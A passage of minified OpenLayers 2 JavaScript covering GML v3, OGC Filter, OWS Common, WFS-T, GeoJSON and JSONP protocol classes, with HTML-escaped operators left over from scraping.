c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0&lt;c.components.length&amp;&amp;(b.components= [new OpenLayers.Geometry.MultiLineString(c.components)])},curveMember:function(a,b){this.readChildNodes(a,b)},MultiSurface:function(a,b){var c={components:[]};this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0&lt;c.components.length&amp;&amp;(b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)])},surfaceMember:function(a,b){this.readChildNodes(a,b)},surfaceMembers:function(a,b){this.readChildNodes(a,b)},pointMembers:function(a,b){this.readChildNodes(a,b)},lineStringMembers:function(a, b){this.readChildNodes(a,b)},polygonMembers:function(a,b){this.readChildNodes(a,b)},geometryMembers:function(a,b){this.readChildNodes(a,b)},Envelope:function(a,b){var c={points:Array(2)};this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))},lowerCorner:function(a,b){var c={};this.readers.gml.pos.apply(this,[a,c]);b.points[0]=c.points[0]},upperCorner:function(a,b){var c={};this.readers.gml.pos.apply(this, [a,c]);b.points[1]=c.points[0]}},OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs},write:function(a){var b;b=OpenLayers.Util.isArray(a)?"featureMembers":"featureMember";a=this.writeNode("gml:"+b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},writers:{gml:OpenLayers.Util.applyDefaults({featureMembers:function(a){for(var b= this.createElementNSPlus("gml:featureMembers"),c=0,d=a.length;c&lt;d;++c)this.writeNode("feature:_typeName",a[c],b);return b},Point:function(a){var b=this.createElementNSPlus("gml:Point");this.writeNode("pos",a,b);return b},pos:function(a){return this.createElementNSPlus("gml:pos",{value:this.xy?a.x+" "+a.y:a.y+" "+a.x})},LineString:function(a){var b=this.createElementNSPlus("gml:LineString");this.writeNode("posList",a.components,b);return b},Curve:function(a){var b=this.createElementNSPlus("gml:Curve"); this.writeNode("segments",a,b);return b},segments:function(a){var b=this.createElementNSPlus("gml:segments");this.writeNode("LineStringSegment",a,b);return b},LineStringSegment:function(a){var b=this.createElementNSPlus("gml:LineStringSegment");this.writeNode("posList",a.components,b);return b},posList:function(a){for(var b=a.length,c=Array(b),d,e=0;e&lt;b;++e)d=a[e],c[e]=this.xy?d.x+" "+d.y:d.y+" "+d.x;return this.createElementNSPlus("gml:posList",{value:c.join(" ")})},Surface:function(a){var b=this.createElementNSPlus("gml:Surface"); this.writeNode("patches",a,b);return b},patches:function(a){var b=this.createElementNSPlus("gml:patches");this.writeNode("PolygonPatch",a,b);return b},PolygonPatch:function(a){var b=this.createElementNSPlus("gml:PolygonPatch",{attributes:{interpolation:"planar"}});this.writeNode("exterior",a.components[0],b);for(var c=1,d=a.components.length;c&lt;d;++c)this.writeNode("interior",a.components[c],b);return b},Polygon:function(a){var b=this.createElementNSPlus("gml:Polygon");this.writeNode("exterior",a.components[0], b);for(var c=1,d=a.components.length;c&lt;d;++c)this.writeNode("interior",a.components[c],b);return b},exterior:function(a){var b=this.createElementNSPlus("gml:exterior");this.writeNode("LinearRing",a,b);return b},interior:function(a){var b=this.createElementNSPlus("gml:interior");this.writeNode("LinearRing",a,b);return b},LinearRing:function(a){var b=this.createElementNSPlus("gml:LinearRing");this.writeNode("posList",a.components,b);return b},MultiCurve:function(a){var b=this.createElementNSPlus("gml:MultiCurve"); a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("curveMember",a[c],b);return b},curveMember:function(a){var b=this.createElementNSPlus("gml:curveMember");this.curve?this.writeNode("Curve",a,b):this.writeNode("LineString",a,b);return b},MultiSurface:function(a){var b=this.createElementNSPlus("gml:MultiSurface");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("surfaceMember",a[c],b);return b},surfaceMember:function(a){var b=this.createElementNSPlus("gml:surfaceMember"); this.surface?this.writeNode("Surface",a,b):this.writeNode("Polygon",a,b);return b},Envelope:function(a){var b=this.createElementNSPlus("gml:Envelope");this.writeNode("lowerCorner",a,b);this.writeNode("upperCorner",a,b);this.srsName&amp;&amp;b.setAttribute("srsName",this.srsName);return b},lowerCorner:function(a){return this.createElementNSPlus("gml:lowerCorner",{value:this.xy?a.left+" "+a.bottom:a.bottom+" "+a.left})},upperCorner:function(a){return this.createElementNSPlus("gml:upperCorner",{value:this.xy? a.right+" "+a.top:a.top+" "+a.right})}},OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs},setGeometryTypes:function(){this.geometryTypes={"OpenLayers.Geometry.Point":"Point","OpenLayers.Geometry.MultiPoint":"MultiPoint","OpenLayers.Geometry.LineString":!0===this.curve?"Curve":"LineString","OpenLayers.Geometry.MultiLineString":!1===this.multiCurve?"MultiLineString":"MultiCurve","OpenLayers.Geometry.Polygon":!0=== this.surface?"Surface":"Polygon","OpenLayers.Geometry.MultiPolygon":!1===this.multiSurface?"MultiPolygon":"MultiSurface","OpenLayers.Geometry.Collection":"GeometryCollection"}},CLASS_NAME:"OpenLayers.Format.GML.v3"});OpenLayers.Format.Filter.v1_1_0=OpenLayers.Class(OpenLayers.Format.GML.v3,OpenLayers.Format.Filter.v1,{VERSION:"1.1.0",schemaLocation:"http://www.opengis.net/ogc/filter/1.1.0/filter.xsd",initialize:function(a){OpenLayers.Format.GML.v3.prototype.initialize.apply(this,[a])},readers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a,b){var c=a.getAttribute("matchCase"),c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.EQUAL_TO,matchCase:!("false"===c||"0"===c)});this.readChildNodes(a, c);b.filters.push(c)},PropertyIsNotEqualTo:function(a,b){var c=a.getAttribute("matchCase"),c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO,matchCase:!("false"===c||"0"===c)});this.readChildNodes(a,c);b.filters.push(c)},PropertyIsLike:function(a,b){var c=new OpenLayers.Filter.Comparison({type:OpenLayers.Filter.Comparison.LIKE});this.readChildNodes(a,c);var d=a.getAttribute("wildCard"),e=a.getAttribute("singleChar"),f=a.getAttribute("escapeChar");c.value2regex(d,e, f);b.filters.push(c)}},OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v3.prototype.readers.gml,feature:OpenLayers.Format.GML.v3.prototype.readers.feature},writers:{ogc:OpenLayers.Util.applyDefaults({PropertyIsEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsEqualTo",{attributes:{matchCase:a.matchCase}});this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsNotEqualTo:function(a){var b=this.createElementNSPlus("ogc:PropertyIsNotEqualTo", {attributes:{matchCase:a.matchCase}});this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b},PropertyIsLike:function(a){var b=this.createElementNSPlus("ogc:PropertyIsLike",{attributes:{matchCase:a.matchCase,wildCard:"*",singleChar:".",escapeChar:"!"}});this.writeNode("PropertyName",a,b);this.writeNode("Literal",a.regex2value(),b);return b},BBOX:function(a){var b=this.createElementNSPlus("ogc:BBOX");a.property&amp;&amp;this.writeNode("PropertyName",a,b);var c=this.writeNode("gml:Envelope", a.value);a.projection&amp;&amp;c.setAttribute("srsName",a.projection);b.appendChild(c);return b},SortBy:function(a){for(var b=this.createElementNSPlus("ogc:SortBy"),c=0,d=a.length;c&lt;d;c++)this.writeNode("ogc:SortProperty",a[c],b);return b},SortProperty:function(a){var b=this.createElementNSPlus("ogc:SortProperty");this.writeNode("ogc:PropertyName",a,b);this.writeNode("ogc:SortOrder","DESC"==a.order?"DESC":"ASC",b);return b},SortOrder:function(a){return this.createElementNSPlus("ogc:SortOrder",{value:a})}}, OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature},writeSpatial:function(a,b){var c=this.createElementNSPlus("ogc:"+b);this.writeNode("PropertyName",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode("Function",a.value,c);else{var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode("feature:_geometry",a.value).firstChild:this.writeNode("gml:Envelope",a.value);a.projection&amp;&amp; d.setAttribute("srsName",a.projection);c.appendChild(d)}return c},CLASS_NAME:"OpenLayers.Format.Filter.v1_1_0"});OpenLayers.Format.OWSCommon=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",getVersion:function(a,b){var c=this.version;if(!c){var d=a.getAttribute("xmlns:ows");d&amp;&amp;"1.1"===d.substring(d.lastIndexOf("/")+1)&amp;&amp;(c="1.1.0");c||(c=this.defaultVersion)}return c},CLASS_NAME:"OpenLayers.Format.OWSCommon"});OpenLayers.Format.OWSCommon.v1=OpenLayers.Class(OpenLayers.Format.XML,{regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},read:function(a,b){OpenLayers.Util.applyDefaults(b,this.options);var c={};this.readChildNodes(a,c);return c},readers:{ows:{Exception:function(a,b){var c={code:a.getAttribute("exceptionCode"),locator:a.getAttribute("locator"),texts:[]};b.exceptions.push(c);this.readChildNodes(a,c)},ExceptionText:function(a,b){var c=this.getChildValue(a);b.texts.push(c)}, ServiceIdentification:function(a,b){b.serviceIdentification={};this.readChildNodes(a,b.serviceIdentification)},Title:function(a,b){b.title=this.getChildValue(a)},Abstract:function(a,b){b["abstract"]=this.getChildValue(a)},Keywords:function(a,b){b.keywords={};this.readChildNodes(a,b.keywords)},Keyword:function(a,b){b[this.getChildValue(a)]=!0},ServiceType:function(a,b){b.serviceType={codeSpace:a.getAttribute("codeSpace"),value:this.getChildValue(a)}},ServiceTypeVersion:function(a,b){b.serviceTypeVersion= this.getChildValue(a)},Fees:function(a,b){b.fees=this.getChildValue(a)},AccessConstraints:function(a,b){b.accessConstraints=this.getChildValue(a)},ServiceProvider:function(a,b){b.serviceProvider={};this.readChildNodes(a,b.serviceProvider)},ProviderName:function(a,b){b.providerName=this.getChildValue(a)},ProviderSite:function(a,b){b.providerSite=this.getAttributeNS(a,this.namespaces.xlink,"href")},ServiceContact:function(a,b){b.serviceContact={};this.readChildNodes(a,b.serviceContact)},IndividualName:function(a, b){b.individualName=this.getChildValue(a)},PositionName:function(a,b){b.positionName=this.getChildValue(a)},ContactInfo:function(a,b){b.contactInfo={};this.readChildNodes(a,b.contactInfo)},Phone:function(a,b){b.phone={};this.readChildNodes(a,b.phone)},Voice:function(a,b){b.voice=this.getChildValue(a)},Address:function(a,b){b.address={};this.readChildNodes(a,b.address)},DeliveryPoint:function(a,b){b.deliveryPoint=this.getChildValue(a)},City:function(a,b){b.city=this.getChildValue(a)},AdministrativeArea:function(a, b){b.administrativeArea=this.getChildValue(a)},PostalCode:function(a,b){b.postalCode=this.getChildValue(a)},Country:function(a,b){b.country=this.getChildValue(a)},ElectronicMailAddress:function(a,b){b.electronicMailAddress=this.getChildValue(a)},Role:function(a,b){b.role=this.getChildValue(a)},OperationsMetadata:function(a,b){b.operationsMetadata={};this.readChildNodes(a,b.operationsMetadata)},Operation:function(a,b){var c=a.getAttribute("name");b[c]={};this.readChildNodes(a,b[c])},DCP:function(a, b){b.dcp={};this.readChildNodes(a,b.dcp)},HTTP:function(a,b){b.http={};this.readChildNodes(a,b.http)},Get:function(a,b){b.get||(b.get=[]);var c={url:this.getAttributeNS(a,this.namespaces.xlink,"href")};this.readChildNodes(a,c);b.get.push(c)},Post:function(a,b){b.post||(b.post=[]);var c={url:this.getAttributeNS(a,this.namespaces.xlink,"href")};this.readChildNodes(a,c);b.post.push(c)},Parameter:function(a,b){b.parameters||(b.parameters={});var c=a.getAttribute("name");b.parameters[c]={};this.readChildNodes(a, b.parameters[c])},Constraint:function(a,b){b.constraints||(b.constraints={});var c=a.getAttribute("name");b.constraints[c]={};this.readChildNodes(a,b.constraints[c])},Value:function(a,b){b[this.getChildValue(a)]=!0},OutputFormat:function(a,b){b.formats.push({value:this.getChildValue(a)});this.readChildNodes(a,b)},WGS84BoundingBox:function(a,b){var c={};c.crs=a.getAttribute("crs");b.BoundingBox?b.BoundingBox.push(c):(b.projection=c.crs,c=b);this.readChildNodes(a,c)},BoundingBox:function(a,b){this.readers.ows.WGS84BoundingBox.apply(this, [a,b])},LowerCorner:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace);b.left=c[0];b.bottom=c[1]},UpperCorner:function(a,b){var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace);b.right=c[0];b.top=c[1];b.bounds=new OpenLayers.Bounds(b.left,b.bottom,b.right,b.top);delete b.left;delete b.bottom;delete b.right;delete b.top}, Language:function(a,b){b.language=this.getChildValue(a)}}},writers:{ows:{BoundingBox:function(a,b){var c=this.createElementNSPlus(b||"ows:BoundingBox",{attributes:{crs:a.projection}});this.writeNode("ows:LowerCorner",a,c);this.writeNode("ows:UpperCorner",a,c);return c},LowerCorner:function(a){return this.createElementNSPlus("ows:LowerCorner",{value:a.bounds.left+" "+a.bounds.bottom})},UpperCorner:function(a){return this.createElementNSPlus("ows:UpperCorner",{value:a.bounds.right+" "+a.bounds.top})}, Identifier:function(a){return this.createElementNSPlus("ows:Identifier",{value:a})},Title:function(a){return this.createElementNSPlus("ows:Title",{value:a})},Abstract:function(a){return this.createElementNSPlus("ows:Abstract",{value:a})},OutputFormat:function(a){return this.createElementNSPlus("ows:OutputFormat",{value:a})}}},CLASS_NAME:"OpenLayers.Format.OWSCommon.v1"});OpenLayers.Format.OWSCommon.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,{namespaces:{ows:"http://www.opengis.net/ows",xlink:"http://www.w3.org/1999/xlink"},readers:{ows:OpenLayers.Util.applyDefaults({ExceptionReport:function(a,b){b.success=!1;b.exceptionReport={version:a.getAttribute("version"),language:a.getAttribute("language"),exceptions:[]};this.readChildNodes(a,b.exceptionReport)}},OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)},writers:{ows:OpenLayers.Format.OWSCommon.v1.prototype.writers.ows}, CLASS_NAME:"OpenLayers.Format.OWSCommon.v1_0_0"});OpenLayers.Format.WFST.v1_1_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_1_0,OpenLayers.Format.WFST.v1,{version:"1.1.0",schemaLocations:{wfs:"http://schemas.opengis.net/wfs/1.1.0/wfs.xsd"},initialize:function(a){OpenLayers.Format.Filter.v1_1_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])},readNode:function(a,b,c){return OpenLayers.Format.GML.v3.prototype.readNode.apply(this,arguments)},readers:{wfs:OpenLayers.Util.applyDefaults({FeatureCollection:function(a, b){b.numberOfFeatures=parseInt(a.getAttribute("numberOfFeatures"));OpenLayers.Format.WFST.v1.prototype.readers.wfs.FeatureCollection.apply(this,arguments)},TransactionResponse:function(a,b){b.insertIds=[];b.success=!1;this.readChildNodes(a,b)},TransactionSummary:function(a,b){b.success=!0},InsertResults:function(a,b){this.readChildNodes(a,b)},Feature:function(a,b){var c={fids:[]};this.readChildNodes(a,c);b.insertIds.push(c.fids[0])}},OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v3.prototype.readers.gml, feature:OpenLayers.Format.GML.v3.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.readers.ogc,ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows},writers:{wfs:OpenLayers.Util.applyDefaults({GetFeature:function(a){var b=OpenLayers.Format.WFST.v1.prototype.writers.wfs.GetFeature.apply(this,arguments);a&amp;&amp;this.setAttributes(b,{resultType:a.resultType,startIndex:a.startIndex,count:a.count});return b},Query:function(a){a=OpenLayers.Util.extend({featureNS:this.featureNS, featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName},a);var b=a.featurePrefix,c=this.createElementNSPlus("wfs:Query",{attributes:{typeName:(b?b+":":"")+a.featureType,srsName:a.srsName}});a.featureNS&amp;&amp;c.setAttribute("xmlns:"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b&lt;d;b++)this.writeNode("wfs:PropertyName",{property:a.propertyNames[b]},c);a.filter&amp;&amp;(OpenLayers.Format.WFST.v1_1_0.prototype.setFilterProperty.call(this,a.filter),this.writeNode("ogc:Filter", a.filter,c));return c},PropertyName:function(a){return this.createElementNSPlus("wfs:PropertyName",{value:a.property})}},OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc},CLASS_NAME:"OpenLayers.Format.WFST.v1_1_0"});OpenLayers.Protocol=OpenLayers.Class({format:null,options:null,autoDestroy:!0,defaultFilter:null,initialize:function(a){a=a||{};OpenLayers.Util.extend(this,a);this.options=a},mergeWithDefaultFilter:function(a){return a&amp;&amp;this.defaultFilter?new OpenLayers.Filter.Logical({type:OpenLayers.Filter.Logical.AND,filters:[this.defaultFilter,a]}):a||this.defaultFilter||void 0},destroy:function(){this.format=this.options=null},read:function(a){a=a||{};a.filter=this.mergeWithDefaultFilter(a.filter)},create:function(){}, update:function(){},"delete":function(){},commit:function(){},abort:function(a){},createCallback:function(a,b,c){return OpenLayers.Function.bind(function(){a.apply(this,[b,c])},this)},CLASS_NAME:"OpenLayers.Protocol"});OpenLayers.Protocol.Response=OpenLayers.Class({code:null,requestType:null,last:!0,features:null,data:null,reqFeatures:null,priv:null,error:null,initialize:function(a){OpenLayers.Util.extend(this,a)},success:function(){return 0&lt;this.code},CLASS_NAME:"OpenLayers.Protocol.Response"}); OpenLayers.Protocol.Response.SUCCESS=1;OpenLayers.Protocol.Response.FAILURE=0;OpenLayers.Format.JSON=OpenLayers.Class(OpenLayers.Format,{indent:" ",space:" ",newline:"\n",level:0,pretty:!1,nativeJSON:function(){return!(!window.JSON||"function"!=typeof JSON.parse||"function"!=typeof JSON.stringify)}(),read:function(a,b){var c;if(this.nativeJSON)c=JSON.parse(a,b);else try{if(/^[\],:{}\s]*$/.test(a.replace(/\\["\\\/bfnrtu]/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))&amp;&amp;(c=eval("("+a+")"),"function"=== typeof b)){var d=function(a,c){if(c&amp;&amp;"object"===typeof c)for(var e in c)c.hasOwnProperty(e)&amp;&amp;(c[e]=d(e,c[e]));return b(a,c)};c=d("",c)}}catch(e){}this.keepData&amp;&amp;(this.data=c);return c},write:function(a,b){this.pretty=!!b;var c=null,d=typeof a;if(this.serialize[d])try{c=!this.pretty&amp;&amp;this.nativeJSON?JSON.stringify(a):this.serialize[d].apply(this,[a])}catch(e){OpenLayers.Console.error("Trouble serializing: "+e)}return c},writeIndent:function(){var a=[];if(this.pretty)for(var b=0;b&lt;this.level;++b)a.push(this.indent); return a.join("")},writeNewline:function(){return this.pretty?this.newline:""},writeSpace:function(){return this.pretty?this.space:""},serialize:{object:function(a){if(null==a)return"null";if(a.constructor==Date)return this.serialize.date.apply(this,[a]);if(a.constructor==Array)return this.serialize.array.apply(this,[a]);var b=["{"];this.level+=1;var c,d,e,f=!1;for(c in a)a.hasOwnProperty(c)&amp;&amp;(d=OpenLayers.Format.JSON.prototype.write.apply(this,[c,this.pretty]),e=OpenLayers.Format.JSON.prototype.write.apply(this, [a[c],this.pretty]),null!=d&amp;&amp;null!=e&amp;&amp;(f&amp;&amp;b.push(","),b.push(this.writeNewline(),this.writeIndent(),d,":",this.writeSpace(),e),f=!0));this.level-=1;b.push(this.writeNewline(),this.writeIndent(),"}");return b.join("")},array:function(a){var b,c=["["];this.level+=1;for(var d=0,e=a.length;d&lt;e;++d)b=OpenLayers.Format.JSON.prototype.write.apply(this,[a[d],this.pretty]),null!=b&amp;&amp;(0&lt;d&amp;&amp;c.push(","),c.push(this.writeNewline(),this.writeIndent(),b));this.level-=1;c.push(this.writeNewline(),this.writeIndent(), "]");return c.join("")},string:function(a){var b={"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"};return/["\\\x00-\x1f]/.test(a)?'"'+a.replace(/([\x00-\x1f\\"])/g,function(a,d){var e=b[d];if(e)return e;e=d.charCodeAt();return"\\u00"+Math.floor(e/16).toString(16)+(e%16).toString(16)})+'"':'"'+a+'"'},number:function(a){return isFinite(a)?String(a):"null"},"boolean":function(a){return String(a)},date:function(a){function b(a){return 10>a?"0"+a:a}return'"'+a.getFullYear()+ "-"+b(a.getMonth()+1)+"-"+b(a.getDate())+"T"+b(a.getHours())+":"+b(a.getMinutes())+":"+b(a.getSeconds())+'"'}},CLASS_NAME:"OpenLayers.Format.JSON"});OpenLayers.Format.GeoJSON=OpenLayers.Class(OpenLayers.Format.JSON,{ignoreExtraDims:!1,read:function(a,b,c){b=b?b:"FeatureCollection";var d=null,e=null,e="string"==typeof a?OpenLayers.Format.JSON.prototype.read.apply(this,[a,c]):a;if(!e)OpenLayers.Console.error("Bad JSON: "+a);else if("string"!=typeof e.type)OpenLayers.Console.error("Bad GeoJSON - no type: "+a);else if(this.isValidType(e,b))switch(b){case "Geometry":try{d=this.parseGeometry(e)}catch(f){OpenLayers.Console.error(f)}break;case "Feature":try{d= this.parseFeature(e),d.type="Feature"}catch(g){OpenLayers.Console.error(g)}break;case "FeatureCollection":switch(d=[],e.type){case "Feature":try{d.push(this.parseFeature(e))}catch(h){d=null,OpenLayers.Console.error(h)}break;case "FeatureCollection":a=0;for(b=e.features.length;a&lt;b;++a)try{d.push(this.parseFeature(e.features[a]))}catch(k){d=null,OpenLayers.Console.error(k)}break;default:try{var l=this.parseGeometry(e);d.push(new OpenLayers.Feature.Vector(l))}catch(m){d=null,OpenLayers.Console.error(m)}}}return d}, isValidType:function(a,b){var c=!1;switch(b){case "Geometry":-1==OpenLayers.Util.indexOf("Point MultiPoint LineString MultiLineString Polygon MultiPolygon Box GeometryCollection".split(" "),a.type)?OpenLayers.Console.error("Unsupported geometry type: "+a.type):c=!0;break;case "FeatureCollection":c=!0;break;default:a.type==b?c=!0:OpenLayers.Console.error("Cannot convert types from "+a.type+" to "+b)}return c},parseFeature:function(a){var b,c,d;c=a.properties?a.properties:{};d=a.geometry&amp;&amp;a.geometry.bbox|| a.bbox;try{b=this.parseGeometry(a.geometry)}catch(e){throw e;}b=new OpenLayers.Feature.Vector(b,c);d&amp;&amp;(b.bounds=OpenLayers.Bounds.fromArray(d));a.id&amp;&amp;(b.fid=a.id);return b},parseGeometry:function(a){if(null==a)return null;var b,c=!1;if("GeometryCollection"==a.type){if(!OpenLayers.Util.isArray(a.geometries))throw"GeometryCollection must have geometries array: "+a;b=a.geometries.length;for(var c=Array(b),d=0;d&lt;b;++d)c[d]=this.parseGeometry.apply(this,[a.geometries[d]]);b=new OpenLayers.Geometry.Collection(c); c=!0}else{if(!OpenLayers.Util.isArray(a.coordinates))throw"Geometry must have coordinates array: "+a;if(!this.parseCoords[a.type.toLowerCase()])throw"Unsupported geometry type: "+a.type;try{b=this.parseCoords[a.type.toLowerCase()].apply(this,[a.coordinates])}catch(e){throw e;}}this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;!c)&amp;&amp;b.transform(this.externalProjection,this.internalProjection);return b},parseCoords:{point:function(a){if(!1==this.ignoreExtraDims&amp;&amp;2!=a.length)throw"Only 2D points are supported: "+ a;return new OpenLayers.Geometry.Point(a[0],a[1])},multipoint:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c=this.parseCoords.point.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiPoint(b)},linestring:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c=this.parseCoords.point.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.LineString(b)},multilinestring:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c= this.parseCoords.linestring.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiLineString(b)},polygon:function(a){for(var b=[],c,d,e=0,f=a.length;e&lt;f;++e){try{d=this.parseCoords.linestring.apply(this,[a[e]])}catch(g){throw g;}c=new OpenLayers.Geometry.LinearRing(d.components);b.push(c)}return new OpenLayers.Geometry.Polygon(b)},multipolygon:function(a){for(var b=[],c=null,d=0,e=a.length;d&lt;e;++d){try{c=this.parseCoords.polygon.apply(this,[a[d]])}catch(f){throw f;}b.push(c)}return new OpenLayers.Geometry.MultiPolygon(b)}, box:function(a){if(2!=a.length)throw"GeoJSON box coordinates must have 2 elements";return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(a[0][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[0][1]),new OpenLayers.Geometry.Point(a[1][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[1][1]),new OpenLayers.Geometry.Point(a[0][0],a[0][1])])])}},write:function(a,b){var c={type:null};if(OpenLayers.Util.isArray(a)){c.type="FeatureCollection";var d= a.length;c.features=Array(d);for(var e=0;e&lt;d;++e){var f=a[e];if(!f instanceof OpenLayers.Feature.Vector)throw"FeatureCollection only supports collections of features: "+f;c.features[e]=this.extract.feature.apply(this,[f])}}else 0==a.CLASS_NAME.indexOf("OpenLayers.Geometry")?c=this.extract.geometry.apply(this,[a]):a instanceof OpenLayers.Feature.Vector&amp;&amp;(c=this.extract.feature.apply(this,[a]),a.layer&amp;&amp;a.layer.projection&amp;&amp;(c.crs=this.createCRSObject(a)));return OpenLayers.Format.JSON.prototype.write.apply(this, [c,b])},createCRSObject:function(a){a=a.layer.projection.toString();var b={};a.match(/epsg:/i)&amp;&amp;(a=parseInt(a.substring(a.indexOf(":")+1)),b=4326==a?{type:"name",properties:{name:"urn:ogc:def:crs:OGC:1.3:CRS84"}}:{type:"name",properties:{name:"EPSG:"+a}});return b},extract:{feature:function(a){var b=this.extract.geometry.apply(this,[a.geometry]),b={type:"Feature",properties:a.attributes,geometry:b};null!=a.fid&amp;&amp;(b.id=a.fid);return b},geometry:function(a){if(null==a)return null;this.internalProjection&amp;&amp; this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b=a.CLASS_NAME.split(".")[2];a=this.extract[b.toLowerCase()].apply(this,[a]);return"Collection"==b?{type:"GeometryCollection",geometries:a}:{type:b,coordinates:a}},point:function(a){return[a.x,a.y]},multipoint:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b},linestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt; d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b},multilinestring:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b},polygon:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.linestring.apply(this,[a.components[c]]));return b},multipolygon:function(a){for(var b=[],c=0,d=a.components.length;c&lt;d;++c)b.push(this.extract.polygon.apply(this,[a.components[c]]));return b},collection:function(a){for(var b= a.components.length,c=Array(b),d=0;d&lt;b;++d)c[d]=this.extract.geometry.apply(this,[a.components[d]]);return c}},CLASS_NAME:"OpenLayers.Format.GeoJSON"});OpenLayers.Protocol.Script=OpenLayers.Class(OpenLayers.Protocol,{url:null,params:null,callback:null,callbackTemplate:"OpenLayers.Protocol.Script.registry.${id}",callbackKey:"callback",callbackPrefix:"",scope:null,format:null,pendingRequests:null,srsInBBOX:!1,initialize:function(a){a=a||{};this.params={};this.pendingRequests={};OpenLayers.Protocol.prototype.initialize.apply(this,arguments);this.format||(this.format=new OpenLayers.Format.GeoJSON);if(!this.filterToParams&amp;&amp;OpenLayers.Format.QueryStringFilter){var b= new OpenLayers.Format.QueryStringFilter({srsInBBOX:this.srsInBBOX});this.filterToParams=function(a,d){return b.write(a,d)}}},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.applyDefaults(a,this.options);a.params=OpenLayers.Util.applyDefaults(a.params,this.options.params);a.filter&amp;&amp;this.filterToParams&amp;&amp;(a.params=this.filterToParams(a.filter,a.params));var b=new OpenLayers.Protocol.Response({requestType:"read"}),c=this.createRequest(a.url,a.params,OpenLayers.Function.bind(function(c){b.data= c;this.handleRead(b,a)},this));b.priv=c;return b},createRequest:function(a,b,c){c=OpenLayers.Protocol.Script.register(c);var d=OpenLayers.String.format(this.callbackTemplate,{id:c});b=OpenLayers.Util.extend({},b);b[this.callbackKey]=this.callbackPrefix+d;a=OpenLayers.Util.urlAppend(a,OpenLayers.Util.getParameterString(b));b=document.createElement("script");b.type="text/javascript";b.src=a;b.id="OpenLayers_Protocol_Script_"+c;this.pendingRequests[b.id]=b;document.getElementsByTagName("head")[0].appendChild(b); return b},destroyRequest:function(a){OpenLayers.Protocol.Script.unregister(a.id.split("_").pop());delete 